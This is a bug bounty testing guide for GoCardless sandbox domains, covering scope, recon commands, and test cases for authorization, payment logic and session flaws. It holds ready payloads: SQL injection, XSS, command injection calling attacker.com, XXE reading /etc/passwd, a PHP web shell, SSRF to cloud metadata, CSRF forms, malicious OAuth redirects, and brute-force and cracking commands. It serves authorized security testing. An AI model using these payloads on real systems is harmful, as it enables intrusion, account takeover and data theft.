# GoCardless Bug Bounty - Complete Testing Guide

> **Project Status:** Phase 2 - Web Dashboard Security Testing  
> **Target:** manage-sandbox.gocardless.com  
> **Authorization:** Confirmed sandbox environment testing  
> **Last Updated:** October 27, 2025

---

## 📑 Table of Contents

- [Program Overview](#program-overview)
- [Rules of Engagement](#rules-of-engagement)
- [Scope & Targets](#scope--targets)
- [Account Setup](#account-setup)
- [Best Starting Point](#best-starting-point)
- [Testing Phases](#testing-phases)
- [High-Value Vulnerabilities](#high-value-vulnerabilities)
- [Tool Arsenal](#tool-arsenal)
- [Command Reference](#command-reference)
- [Testing Checklist](#testing-checklist)
- [Out of Scope](#out-of-scope)
- [Reporting Guidelines](#reporting-guidelines)

---

## 🎯 Program Overview

GoCardless operates a recurring payments platform with a global bank debit network. The bug bounty program covers public-facing websites and focuses on protecting businesses and customer data.

### Key Points
- **Platform:** Recurring payments, subscriptions, invoices
- **Environment:** Sandbox testing required (NOT production)
- **Disclosure:** Private program - no public disclosure allowed
- **Bounty:** Paid within 30 days of triage
- **Contact:** Via HackerOne platform only

---

## ⚖️ Rules of Engagement

### ✅ Allowed
- Automated scanning on sandbox environments
- Creating test accounts with HackerOne alias
- Testing all sandbox domains
- Responsible vulnerability testing

### ❌ Prohibited
- Social engineering (phishing, vishing, smishing)
- Accessing/modifying other users' data
- Testing on production environments (without approval)
- Degrading or interrupting services
- Threatening or extorting GoCardless
- Using real payment data or causing financial loss
- Public disclosure of vulnerabilities

### Requirements
- Must include working Proof of Concept (PoC)
- Must use HackerOne email alias for all accounts
- Add "bug bounty" to company/name field
- Follow HackerOne platform rules
- Detailed reports (vague reports not eligible)

---

## 🎯 Scope & Targets

### In-Scope Domains (Sandbox - Full Testing)

| Domain | Purpose | Automation Allowed |
|--------|---------|-------------------|
| `https://manage-sandbox.gocardless.com` | **PRIMARY TARGET** - Web Dashboard | ✅ Yes |
| `https://api-sandbox.gocardless.com` | REST API | ✅ Yes |
| `https://payer-details-sandbox.gocardless.com` | Payer portal | ✅ Yes |
| `https://oauth-sandbox.gocardless.com` | OAuth flows | ✅ Yes |
| `https://connect-sandbox.gocardless.com` | Partner integrations | ✅ Yes |
| `https://pay-sandbox.gocardless.com` | Payment flows | ✅ Yes |

### In-Scope (Manual Testing Only - NO AUTOMATION)

| Domain | Purpose | Automation Allowed |
|--------|---------|-------------------|
| `https://bankaccountdata.gocardless.com` | Bank data portal | ❌ Manual only |
| `https://auth0.gocardless.com` | Authentication | ❌ Manual only |
| `https://ob.gocardless.com` | Open banking | ❌ Manual only |

### Out-of-Scope (DO NOT TEST)
- ❌ `https://manage.gocardless.com` (production)
- ❌ `https://api.gocardless.com` (production)
- ❌ Third-party SaaS (Zendesk, Jira, etc.)
- ❌ Forked, mirrored, or archived GitHub repos

---

## 👤 Account Setup

### Step 1: Get HackerOne Email Alias

1. Visit your HackerOne profile settings
2. Generate email alias (format: `hackerYOURNAME@wearehackerone.com`)
3. Documentation: https://docs.hackerone.com/hackers/hacker-email-alias.html

### Step 2: Register on GoCardless Sandbox

```bash
# Registration URL
https://manage-sandbox.gocardless.com/signup

# Required fields:
# - Email: YOUR_HACKERONE_ALIAS@wearehackerone.com
# - Company Name: "Bug Bounty" or "Security Research"
# - Other fields: Use test data
```

### Step 3: Explore Documentation

- Getting started: https://gocardless.com/guides/getting-started/
- Developer docs: https://developer.gocardless.com/
- Partner integration: https://gocardless.com/guides/partners/
- Bank Account Data sandbox: https://developer.gocardless.com/bank-account-data/sandbox-data/

---

## 🏆 Best Starting Point

### **PRIMARY TARGET: `manage-sandbox.gocardless.com`**

**Why This Target?**
1. **Feature-rich** - Most functionality and attack surface
2. **Business logic** - Payment processing = high-value bugs
3. **Authentication/Authorization** - Multiple user roles
4. **Full automation allowed** - Can use all tools
5. **Highest bounty potential** - Critical business functions

**Expected Vulnerability Types:**
- IDOR (Insecure Direct Object References)
- Privilege escalation
- Business logic flaws in payment flows
- API authorization issues
- XSS in dashboard features
- SQL injection in search/filters

---

## 🗓️ Testing Phases

### Phase 1: Setup & Reconnaissance (Day 1)

```bash
# Create workspace
mkdir -p ~/gocardless-pentest/{recon,scans,screenshots,notes,exploits,reports}
cd ~/gocardless-pentest

# Initialize documentation
cat > notes/testing-log.md << 'EOF'
# GoCardless Testing Log

## Session 1 - [DATE]
### Activities:
- 

### Findings:
- 

### Next Steps:
- 
EOF
```

**Tasks:**
- [ ] Get HackerOne alias
- [ ] Register sandbox account
- [ ] Review all documentation
- [ ] Set up testing tools
- [ ] Browse application manually (map features)

---

### Phase 2: Passive Reconnaissance (Day 1-2)

**Objectives:**
- Map attack surface
- Identify technologies
- Find hidden endpoints
- Gather intelligence

**Commands:**

```bash
# Subdomain enumeration
subfinder -d gocardless.com -o recon/subdomains.txt
amass enum -d gocardless.com -o recon/amass-subdomains.txt

# Filter for sandbox domains
grep -i "sandbox" recon/subdomains.txt > recon/sandbox-domains.txt

# DNS enumeration
dnsenum gocardless.com | tee recon/dns-enum.txt
dnsrecon -d gocardless.com -t std | tee recon/dnsrecon.txt

# Technology fingerprinting
whatweb manage-sandbox.gocardless.com | tee recon/tech-stack.txt
wafw00f manage-sandbox.gocardless.com | tee recon/waf-detection.txt

# SSL/TLS analysis
sslscan manage-sandbox.gocardless.com | tee recon/ssl-scan.txt
testssl manage-sandbox.gocardless.com | tee recon/testssl-results.txt

# Historical data (find old/hidden endpoints)
waybackurls manage-sandbox.gocardless.com | tee recon/wayback-urls.txt
gau manage-sandbox.gocardless.com | tee recon/gau-urls.txt

# GitHub reconnaissance (look for leaked credentials, tokens)
github-search -s "gocardless" -t YOUR_GITHUB_TOKEN > recon/github-leaks.txt
truffleHog https://github.com/gocardless --regex --entropy=True

# Certificate transparency logs
curl -s "https://crt.sh/?q=%.gocardless.com&output=json" | jq -r '.[].name_value' | sort -u > recon/crt-sh-domains.txt
```

**Checklist:**
- [ ] Subdomain enumeration complete
- [ ] Technology stack identified
- [ ] WAF/Security measures detected
- [ ] Historical endpoints collected
- [ ] GitHub reconnaissance done

---

### Phase 3: Active Reconnaissance (Day 2-3)

**Objectives:**
- Port scanning
- Service enumeration
- Directory/file discovery
- Endpoint mapping

**Commands:**

```bash
# Port scanning
nmap -sV -sC -p- manage-sandbox.gocardless.com -oA scans/nmap-full
nmap -sV -sC -p 80,443,8080,8443 -A manage-sandbox.gocardless.com -oA scans/nmap-web

# Service enumeration
nmap -sV --script=http-enum manage-sandbox.gocardless.com -oA scans/nmap-http-enum

# Directory/file bruteforcing (start with common files)
gobuster dir -u https://manage-sandbox.gocardless.com \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -o scans/gobuster-dirs.txt \
  -t 50 \
  -x php,html,js,json,xml,txt,bak,old,zip,sql,config \
  -b 404,403 \
  --exclude-length 0

# Alternative directory scanner
feroxbuster -u https://manage-sandbox.gocardless.com \
  -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \
  -x php,html,json,xml,txt,js \
  -o scans/feroxbuster-results.txt

# Nikto web vulnerability scanner
nikto -h https://manage-sandbox.gocardless.com -output scans/nikto-scan.txt -Format txt

# Check for common files
ffuf -u https://manage-sandbox.gocardless.com/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -mc 200,301,302,403 \
  -o scans/ffuf-common-files.json

# API endpoint discovery
ffuf -u https://api-sandbox.gocardless.com/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -mc 200,201,301,302,401,403 \
  -o scans/api-endpoints.json
```

**Checklist:**
- [ ] Port scan complete
- [ ] Directory enumeration done
- [ ] Common files checked
- [ ] API endpoints discovered
- [ ] Nikto scan reviewed

---

### Phase 4: Manual Testing & Mapping (Day 3-4)

**Objectives:**
- Map all application features
- Understand business logic
- Identify user roles
- Document API calls

**Tools:**
- Burp Suite Professional/Community
- OWASP ZAP
- Browser DevTools
- Postman/Insomnia

**Burp Suite Setup:**

```bash
# Start Burp Suite
burpsuite &

# Configure browser proxy: 127.0.0.1:8080
# Import CA certificate: http://burp
# Enable Intercept
```

**Manual Testing Steps:**

1. **User Registration/Login**
   - [ ] Create multiple accounts (different roles if possible)
   - [ ] Test password policies
   - [ ] Check session management
   - [ ] Note all cookies/tokens

2. **Feature Mapping**
   - [ ] Dashboard/Home
   - [ ] Payment creation
   - [ ] Subscription management
   - [ ] Customer management
   - [ ] Reports/Analytics
   - [ ] Settings/Profile
   - [ ] API integration pages
   - [ ] Webhook configuration
   - [ ] Team/User management
   - [ ] Billing/Invoicing

3. **Crawl with Authentication**
   ```bash
   # Burp Spider with authenticated session
   # OR use CLI tool:
   
   gospider -s https://manage-sandbox.gocardless.com \
     -c 10 -d 5 \
     --cookie "session=YOUR_SESSION_COOKIE" \
     -o recon/spider-auth
   
   # Extract all URLs
   katana -u https://manage-sandbox.gocardless.com \
     -H "Cookie: session=YOUR_SESSION_COOKIE" \
     -d 5 \
     -o recon/katana-urls.txt
   ```

4. **JavaScript Analysis**
   ```bash
   # Download all JS files
   wget -r -l 1 -H -t 1 -nd -N -np -A.js -erobots=off \
     https://manage-sandbox.gocardless.com
   
   # Analyze JS for secrets/endpoints
   python3 /opt/LinkFinder/linkfinder.py \
     -i https://manage-sandbox.gocardless.com \
     -o recon/js-endpoints.html
   
   # Extract API endpoints from JS
   cat *.js | grep -oP '["'"'"']/api/[^"'"'"']*' | sort -u > recon/js-api-endpoints.txt
   
   # Look for sensitive data
   grep -r -E "(api_key|secret|password|token|api_secret)" *.js
   ```

**Checklist:**
- [ ] All features mapped in spreadsheet
- [ ] User roles documented
- [ ] All API endpoints listed
- [ ] JavaScript analyzed for secrets
- [ ] Burp site map complete

---

### Phase 5: Vulnerability Testing (Day 4-10)

See [High-Value Vulnerabilities](#high-value-vulnerabilities) section below for detailed testing.

---

## 💎 High-Value Vulnerabilities

### 1. IDOR (Insecure Direct Object References) ⭐⭐⭐⭐⭐

**Priority:** CRITICAL - Test this first!

**Description:** Access other users' resources by manipulating IDs/UUIDs in requests.

**Testing Approach:**

```bash
# Create two test accounts
# Account A: your_alias+user1@wearehackerone.com
# Account B: your_alias+user2@wearehackerone.com

# Test all endpoints that use IDs:
# 1. Payment IDs
# 2. Customer IDs
# 3. Mandate IDs
# 4. Subscription IDs
# 5. User/Team IDs
# 6. Document/Invoice IDs
# 7. Webhook IDs
```

**Test Cases:**

| Endpoint Example | Test | Expected |
|-----------------|------|----------|
| `/payments/PM123` | Change PM123 to PM124 (user B's payment) | Should deny |
| `/api/customers/CU456` | Access CU456 from different account | Should deny |
| `/subscriptions/SB789/cancel` | Cancel another user's subscription | Should deny |
| `/webhooks/WH111/delete` | Delete another merchant's webhook | Should deny |

**Burp Suite Method:**
1. Log in as User A, capture all requests
2. Log in as User B, capture all requests
3. Use Burp Comparer to find ID patterns
4. Use Burp Intruder to test ID ranges
5. Try User A's session with User B's IDs

**Automation Script:**

```python
# Create file: exploits/idor-test.py
import requests

session_user_a = "YOUR_SESSION_A"
session_user_b = "YOUR_SESSION_B"

# IDs from User B
user_b_ids = ["PM124", "CU456", "SB789"]

for resource_id in user_b_ids:
    # Try accessing User B's resource with User A's session
    response = requests.get(
        f"https://api-sandbox.gocardless.com/payments/{resource_id}",
        headers={"Authorization": f"Bearer {session_user_a}"}
    )
    
    if response.status_code == 200:
        print(f"[VULN] IDOR found! User A accessed {resource_id}")
    else:
        print(f"[SAFE] Access denied for {resource_id}")
```

---

### 2. Privilege Escalation ⭐⭐⭐⭐⭐

**Priority:** CRITICAL

**Description:** Escalate from lower privileges (read_only) to higher privileges (admin/read_write).

**User Roles in GoCardless:**
- **Admin:** Full access
- **Read_write:** Can create/modify payments
- **Read_only:** View-only access

**Test Cases:**

```bash
# Create 3 accounts with different roles
# 1. Admin account
# 2. Read_write account
# 3. Read_only account
```

**Testing Checklist:**

- [ ] **Horizontal Escalation:** Can read_only user modify their role?
  ```http
  POST /api/users/USER123
  {"role": "admin"}
  ```

- [ ] **Parameter Manipulation:** Change role in request
  ```http
  POST /api/payments/create
  {"amount": "100", "role": "admin"}
  ```

- [ ] **Cookie Tampering:** Modify role in session cookie/JWT
  ```bash
  # Decode JWT token
  echo "YOUR_JWT_TOKEN" | jwt decode -
  
  # Look for role claims, try to manipulate
  ```

- [ ] **API Endpoint Access:** Can read_only user access admin endpoints?
  ```bash
  # As read_only user, try:
  curl -X DELETE https://api-sandbox.gocardless.com/webhooks/WH123 \
    -H "Authorization: Bearer READONLY_TOKEN"
  ```

- [ ] **Function-level Access Control:** Test admin functions
  - Create webhooks
  - Delete team members
  - Modify organization settings
  - Access billing information
  - Export customer data

---

### 3. Business Logic Flaws ⭐⭐⭐⭐⭐

**Priority:** CRITICAL (Highest Bounty Potential!)

**Description:** Bypass payment logic, manipulate amounts, abuse refunds, etc.

**Payment Manipulation Tests:**

```bash
# Test negative amounts
POST /api/payments
{
  "amount": "-100",
  "currency": "GBP"
}

# Test zero amounts
{
  "amount": "0",
  "currency": "GBP"
}

# Test integer overflow
{
  "amount": "999999999999999",
  "currency": "GBP"
}

# Test currency mismatch
{
  "amount": "100",
  "currency": "USD",
  "customer_bank_currency": "GBP"
}

# Test decimal manipulation
{
  "amount": "0.01"  # Can you create payment for 1 penny?
}
```

**Refund Abuse Tests:**

```bash
# Test double refund
POST /api/refunds
{"payment_id": "PM123", "amount": "100"}
# Immediately send again
POST /api/refunds
{"payment_id": "PM123", "amount": "100"}

# Test refund more than payment
POST /api/refunds
{"payment_id": "PM123", "amount": "200"}  # Original payment was 100

# Test refund after cancellation
# 1. Create payment
# 2. Cancel payment
# 3. Try to refund
```

**Subscription Tests:**

```bash
# Test subscription without payment method
POST /api/subscriptions
{
  "amount": "10",
  "interval": "monthly"
  # No mandate_id or payment_method?
}

# Test changing subscription amount retroactively
PATCH /api/subscriptions/SB123
{
  "amount": "1",  # Reduce from 100 to 1
  "effective_date": "2024-01-01"  # Past date
}

# Test unlimited trial period
POST /api/subscriptions
{
  "trial_period_days": 999999
}
```

**Rate Limiting on Critical Functions:**

```bash
# Test payment creation rate limit
for i in {1..100}; do
  curl -X POST https://api-sandbox.gocardless.com/payments \
    -H "Authorization: Bearer YOUR_TOKEN" \
    -d '{"amount": "1", "currency": "GBP"}'
done

# If no rate limit = potential abuse
```

---

### 4. Authentication & Session Management ⭐⭐⭐⭐

**Priority:** HIGH

**Password Reset Tests:**

```bash
# Test token predictability
# 1. Request password reset
# 2. Analyze token pattern
# 3. Try to guess other users' tokens

# Test token expiration
# 1. Request reset link
# 2. Wait 24 hours
# 3. Try to use token

# Test token reuse
# 1. Use reset token once
# 2. Try to use same token again

# Test account takeover via reset
# 1. Request reset for victim@example.com
# 2. Intercept request
# 3. Change email to attacker@example.com
```

**Session Management Tests:**

```bash
# Test session fixation
# 1. Get session ID before login
# 2. Login
# 3. Check if session ID changed

# Test concurrent sessions
# 1. Login from Browser A
# 2. Login from Browser B with same account
# 3. Check if Browser A session is invalidated

# Test session timeout
# 1. Login
# 2. Wait (test different periods: 1h, 24h, 7d)
# 3. Check if session expires

# Test logout functionality
# 1. Login and copy session cookie
# 2. Logout
# 3. Try using old session cookie
```

**JWT Token Tests (if applicable):**

```bash
# Decode JWT
jwt_tool YOUR_TOKEN

# Test "none" algorithm
jwt_tool YOUR_TOKEN -X a

# Test weak secret
jwt_tool YOUR_TOKEN -C -d /usr/share/wordlists/rockyou.txt

# Test tampering
jwt_tool YOUR_TOKEN -T
```

---

### 5. Injection Attacks ⭐⭐⭐⭐

**Priority:** HIGH

**SQL Injection:**

```bash
# Automated testing with SQLmap
sqlmap -u "https://manage-sandbox.gocardless.com/search?q=test" \
  --cookie="session=YOUR_SESSION" \
  --level=5 \
  --risk=3 \
  --batch \
  --random-agent \
  --tamper=space2comment \
  -o scans/sqlmap-results.txt

# Test all input fields:
# - Search boxes
# - Filter parameters
# - Sort parameters
# - Date ranges
# - Export functions

# Manual payloads:
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
admin'--
' UNION SELECT NULL--
' AND 1=1--
```

**XSS (Cross-Site Scripting):**

```bash
# Automated XSS scanning
dalfox url https://manage-sandbox.gocardless.com/search?q=FUZZ \
  --cookie="session=YOUR_SESSION" \
  -o scans/xss-results.txt

# Test all input fields:
# - Profile name
# - Company name
# - Customer names
# - Payment descriptions
# - Notes/Comments
# - Webhook URLs
# - Custom fields

# Payloads:
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
javascript:alert(1)
<iframe src=javascript:alert(1)>

# DOM-based XSS
# Check URL fragments: #<script>alert(1)</script>
```

**Command Injection:**

```bash
# Test in file upload features
# Test in export/download functions
# Test in webhook URLs

# Payloads:
; ls -la
| whoami
` id `
$( whoami )
& ping -c 4 attacker.com &
```

**XXE (XML External Entity):**

```bash
# If application accepts XML input:

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>

# Test in:
# - File uploads (if XML accepted)
# - API requests with XML content-type
# - SOAP endpoints (if any)
```

**SSRF (Server-Side Request Forgery):**

```bash
# Test in:
# - Webhook URL configuration
# - Import from URL features
# - Logo/Image upload from URL
# - API callback URLs

# Payloads:
http://169.254.169.254/latest/meta-data/
http://localhost:80
http://127.0.0.1:8080
http://[::1]:80
http://0.0.0.0:80

# Try accessing internal services:
http://internal-api.gocardless.com
```

---

### 6. Authorization Issues (API) ⭐⭐⭐⭐

**Priority:** HIGH

**Testing Strategy:**

```bash
# 1. Map all API endpoints
# 2. Test each endpoint with:
#    - No authentication
#    - Different user's token
#    - Expired token
#    - Modified token

# Example tests:
# Endpoint: GET /api/payments/PM123

# Test 1: No auth
curl https://api-sandbox.gocardless.com/payments/PM123

# Test 2: Different user's payment with your token
curl https://api-sandbox.gocardless.com/payments/PM456 \
  -H "Authorization: Bearer YOUR_TOKEN"

# Test 3: Modified token
curl https://api-sandbox.gocardless.com/payments/PM123 \
  -H "Authorization: Bearer MODIFIED_TOKEN"

# Test 4: HTTP verb tampering
# If GET is allowed, try:
POST /api/payments/PM123
PUT /api/payments/PM123
DELETE /api/payments/PM123
```

**API-Specific Tests:**

```bash
# Test mass assignment
POST /api/customers
{
  "name": "Test",
  "is_admin": true,  # Try to set privileged field
  "account_balance": 999999
}

# Test parameter pollution
GET /api/payments?id=PM123&id=PM456

# Test API versioning issues
# If current version is v2, try:
GET /api/v1/payments/PM123  # Old version might have weak auth

# Test nested resource access
GET /api/merchants/MER123/payments/PM456
# Can you access another merchant's payments?
```

---

### 7. CSRF (Cross-Site Request Forgery) ⭐⭐⭐

**Priority:** MEDIUM (Test on critical actions only)

**Note:** Basic CSRF on non-sensitive endpoints is out of scope, but CSRF on payment/financial operations may be in scope.

**Test Critical Actions:**

```html
<!-- Test CSRF on payment creation -->
<html>
<body>
<form action="https://manage-sandbox.gocardless.com/api/payments" method="POST">
  <input type="hidden" name="amount" value="1000" />
  <input type="hidden" name="currency" value="GBP" />
  <input type="submit" value="Click me" />
</form>
<script>
  document.forms[0].submit();
</script>
</body>
</html>

<!-- Test CSRF on webhook creation -->
<html>
<body>
<form action="https://manage-sandbox.gocardless.com/api/webhooks" method="POST">
  <input type="hidden" name="url" value="https://attacker.com/webhook" />
  <input type="submit" value="Click me" />
</form>
</body>
</html>
```

**Testing Checklist:**
- [ ] CSRF token present?
- [ ] CSRF token validated?
- [ ] CSRF token tied to session?
- [ ] SameSite cookie attribute set?
- [ ] Referer header checked?

---

### 8. File Upload Vulnerabilities ⭐⭐⭐

**Priority:** MEDIUM-HIGH

**Test File Upload Features:**

```bash
# Identify upload features:
# - Logo upload
# - Customer CSV import
# - Document upload
# - Profile picture

# Tests:
```

**1. Malicious File Types:**

```bash
# PHP shell (if server executes PHP)
shell.php:
<?php system($_GET['cmd']); ?>

# Try bypasses:
shell.php.jpg
shell.jpg.php
shell.php%00.jpg
shell.php;.jpg
shell.php%0a.jpg
```

**2. XXE via File Upload:**

```xml
<!-- If XML/SVG files accepted -->
<?xml version="1.0"?>
<!DOCTYPE svg [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg>&xxe;</svg>
```

**3. Path Traversal:**

```bash
# Filename manipulation
../../../etc/passwd
....//....//....//etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
```

**4. Content-Type Bypass:**

```bash
# Upload shell.php with Content-Type: image/jpeg
# Upload image.jpg with Content-Type: application/x-php
```

---

### 9. OAuth/SSO Vulnerabilities ⭐⭐⭐⭐

**Priority:** HIGH

**OAuth Testing Checklist:**

```bash
# If GoCardless uses OAuth:
# Test domain: https://oauth-sandbox.gocardless.com
```

- [ ] **redirect_uri validation**
  ```
  # Try:
  redirect_uri=https://attacker.com
  redirect_uri=https://manage-sandbox.gocardless.com.attacker.com
  redirect_uri=https://manage-sandbox.gocardless.com@attacker.com
  redirect_uri=https://manage-sandbox.gocardless.com/callback/../attacker.com
  ```

- [ ] **Authorization code leakage**
  ```
  # Check Referer header when redirecting
  # Check browser history
  ```

- [ ] **State parameter**
  ```
  # Is state parameter present?
  # Is it validated?
  # Test CSRF without state
  ```

- [ ] **Token theft**
  ```
  # Capture OAuth flow
  # Try to reuse tokens
  # Check token expiration
  ```

---

### 10. GraphQL Vulnerabilities ⭐⭐⭐

**Priority:** MEDIUM (if GraphQL is used)

**Reconnaissance:**

```bash
# Detect GraphQL endpoint
curl -X POST https://api-sandbox.gocardless.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "query { __typename }"}'

# Introspection query
curl -X POST https://api-sandbox.gocardless.com/graphql \
  -H "Content-Type: application/json" \
  -d @introspection-query.json \
  > recon/graphql-schema.json
```

**Attacks:**

```bash
# Install GraphQL tools
pip3 install graphql-cop

# Automated testing
graphql-cop -t https://api-sandbox.gocardless.com/graphql \
  -o scans/graphql-vulnerabilities.txt

# Test for:
# - Introspection enabled (leak schema)
# - No depth limiting (DoS via nested queries)
# - Field suggestions (leak hidden fields)
# - Batch attacks (bypass rate limiting)
```

---

## 🛠️ Tool Arsenal

### Essential Tools Installed

```bash
# Verify installation
which nmap gobuster sqlmap nikto burpsuite hydra john wpscan
```

### Additional Tools to Install

```bash
# Subdomain enumeration
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install github.com/tomnomnom/assetfinder@latest
go install github.com/OWASP/Amass/v3/...@latest

# Web crawling
go install github.com/jaeles-project/gospider@latest
go install github.com/projectdiscovery/katana/cmd/katana@latest

# URL gathering
go install github.com/tomnomnom/waybackurls@latest
go install github.com/lc/gau/v2/cmd/gau@latest

# XSS testing
go install github.com/hahwul/dalfox/v2@latest

# Directory bruteforcing
go install github.com/ffuf/ffuf@latest
go install github.com/epi052/feroxbuster@latest

# JWT tools
pip3 install pyjwt
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool && chmod +x jwt_tool.py

# JavaScript analysis
git clone https://github.com/GerbenJavado/LinkFinder.git
cd LinkFinder && pip3 install -r requirements.txt

# API testing
sudo apt install postman

# GraphQL testing
pip3 install graphql-cop

# GitHub recon
go install github.com/zricethezav/gitleaks/v8@latest
pip3 install truffleHog
```

---

## 📋 Command Reference

### Quick Reference Card

```bash
# ============================================
# RECONNAISSANCE
# ============================================

# Subdomain enum
subfinder -d gocardless.com -o subdomains.txt
amass enum -d gocardless.com -o amass.txt

# Tech detection
whatweb TARGET_URL
wafw00f TARGET_URL

# SSL/TLS
sslscan TARGET_URL
testssl TARGET_URL

# DNS
dnsenum domain.com
dnsrecon -d domain.com

# Historical data
waybackurls TARGET_URL
gau TARGET_URL

# ============================================
# ACTIVE SCANNING
# ============================================

# Port scan
nmap -sV -sC -p- TARGET_IP -oA nmap-scan

# Directory brute
gobuster dir -u TARGET_URL -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,js

# Web vuln scan
nikto -h TARGET_URL

# API fuzzing
ffuf -u TARGET_URL/FUZZ -w wordlist.txt -mc 200,301,302

# ============================================
# VULNERABILITY TESTING
# ============================================

# SQL Injection
sqlmap -u "TARGET_URL" --cookie="SESSION" --batch --level=5 --risk=3

# XSS
dalfox url TARGET_URL --cookie="SESSION"

# JWT decode
echo TOKEN | base64 -d

# ============================================
# AUTHENTICATION TESTING
# ============================================

# Brute force
hydra -L users.txt -P passwords.txt TARGET_URL http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"

# Password cracking
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# ============================================
# API TESTING
# ============================================

# Test endpoint
curl -X GET "https://api-sandbox.gocardless.com/endpoint" \
  -H "Authorization: Bearer TOKEN"

# Mass assignment
curl -X POST "https://api-sandbox.gocardless.com/resource" \
  -H "Content-Type: application/json" \
  -d '{"field":"value", "is_admin":true}'

# ============================================
# JAVASCRIPT ANALYSIS
# ============================================

# Extract endpoints
python3 LinkFinder/linkfinder.py -i TARGET_URL -o output.html

# Find secrets
grep -r "api_key\|secret\|password" *.js

# ============================================
# BURP SUITE
# ============================================

# Start Burp
burpsuite &

# Proxy: 127.0.0.1:8080
# Browser: Set proxy to Burp
# Import CA cert: http://burp
```

---

## ✅ Testing Checklist

### Pre-Testing Setup
- [ ] HackerOne email alias obtained
- [ ] Sandbox account created (with "bug bounty" in company name)
- [ ] Testing environment set up
- [ ] Documentation reviewed
- [ ] Tools installed and verified
- [ ] Workspace organized

### Phase 1: Reconnaissance
- [ ] Subdomain enumeration
- [ ] DNS enumeration
- [ ] Technology fingerprinting
- [ ] WAF detection
- [ ] SSL/TLS analysis
- [ ] Historical data gathering (Wayback)
- [ ] GitHub reconnaissance
- [ ] Certificate transparency logs

### Phase 2: Active Scanning
- [ ] Port scanning
- [ ] Service enumeration
- [ ] Directory/file discovery
- [ ] API endpoint discovery
- [ ] Nikto scan
- [ ] JavaScript file collection

### Phase 3: Manual Application Mapping
- [ ] All features documented
- [ ] User workflows mapped
- [ ] API calls documented
- [ ] User roles understood
- [ ] Business logic documented
- [ ] Burp site map complete

### Phase 4: Authentication Testing
- [ ] Registration process tested
- [ ] Login mechanism tested
- [ ] Password reset tested
- [ ] Session management tested
- [ ] Logout functionality tested
- [ ] 2FA tested (if present)
- [ ] OAuth/SSO tested (if present)
- [ ] JWT tokens analyzed (if used)

### Phase 5: Authorization Testing
- [ ] IDOR on all resources tested
- [ ] Privilege escalation tested
- [ ] Horizontal access control tested
- [ ] API authorization tested
- [ ] Function-level access control tested
- [ ] Missing authorization checked

### Phase 6: Input Validation
- [ ] SQL injection tested
- [ ] XSS tested (stored, reflected, DOM)
- [ ] Command injection tested
- [ ] XXE tested
- [ ] SSRF tested
- [ ] Path traversal tested
- [ ] File upload vulnerabilities tested

### Phase 7: Business Logic
- [ ] Payment amount manipulation tested
- [ ] Negative amounts tested
- [ ] Currency manipulation tested
- [ ] Refund abuse tested
- [ ] Subscription bypass tested
- [ ] Rate limiting on critical functions tested
- [ ] Integer overflow tested
- [ ] Race conditions tested

### Phase 8: API Security
- [ ] Authentication tested
- [ ] Authorization tested
- [ ] Rate limiting tested
- [ ] Mass assignment tested
- [ ] Parameter pollution tested
- [ ] HTTP verb tampering tested
- [ ] API versioning tested

### Phase 9: Session Management
- [ ] Session fixation tested
- [ ] Concurrent sessions tested
- [ ] Session timeout tested
- [ ] Cookie security tested
- [ ] Token security tested

### Phase 10: Additional Tests
- [ ] CSRF on critical actions
- [ ] Webhook security tested
- [ ] GraphQL tested (if present)
- [ ] WebSocket security (if present)
- [ ] Export/Download functions tested
- [ ] Third-party integrations tested

---

## ❌ Out of Scope

### Vulnerabilities NOT Eligible for Bounty

- ❌ Clickjacking
- ❌ Unauthenticated CSRF (logout, login, search)
- ❌ MITM or physical access required attacks
- ❌ Vulnerable libraries without PoC
- ❌ Zero-days < 30 days old (case-by-case)
- ❌ CSV injection
- ❌ Missing SSL/TLS best practices
- ❌ Missing CSP best practices
- ❌ Missing cookie flags (alone)
- ❌ Missing security headers (alone)
- ❌ CORS misconfiguration without impact
- ❌ Email best practices (SPF/DKIM/DMARC)
- ❌ Outdated browser issues
- ❌ Minor information disclosure (versions, banners)
- ❌ Rate limiting → spam (except auth)
- ❌ Content spoofing without PoC
- ❌ User/email enumeration
- ❌ Read_only → Read_write access to developers section (by design)
- ❌ Privilege escalation between admin & read_write on GC4X (same permissions)
- ❌ Public Jira service desk registration
- ❌ Hypothetical subdomain takeover without evidence
- ❌ Unlikely user interaction scenarios
- ❌ Open redirect without additional impact
- ❌ Leaked credentials from third-party sites (no bounty, but can report)

### Domains NOT in Scope

- ❌ Production environments without approval
- ❌ Third-party SaaS (Zendesk, Jira)
- ❌ Forked/mirrored/archived GitHub repos

---

## 📝 Reporting Guidelines

### Report Structure

```markdown
# Vulnerability Title

## Summary
[Brief description of vulnerability]

## Severity
[Critical / High / Medium / Low / Informational]

## Vulnerability Type
[IDOR / SQL Injection / XSS / etc.]

## Affected URL/Endpoint
https://manage-sandbox.gocardless.com/endpoint

## Steps to Reproduce

1. Login to sandbox account with credentials: [email]
2. Navigate to [URL]
3. Intercept request with Burp Suite
4. Change parameter X to Y
5. Observe response Z

## Proof of Concept

### Request:
```http
POST /api/payments HTTP/1.1
Host: api-sandbox.gocardless.com
Authorization: Bearer ATTACKER_TOKEN

{"payment_id": "VICTIM_PAYMENT_ID"}
```

### Response:
```json
{
  "amount": 1000,
  "customer": "victim@example.com"
}
```

## Impact

- Attacker can access/modify other users' data
- Financial loss possible
- Privacy violation
- [Specific business impact]

## Remediation

1. Implement proper authorization checks
2. Verify user ownership of resources
3. Use session-based authorization
4. [Specific recommendations]

## References

- OWASP: [relevant link]
- CWE: [relevant CWE number]

## Attachments

- Screenshot 1: [description]
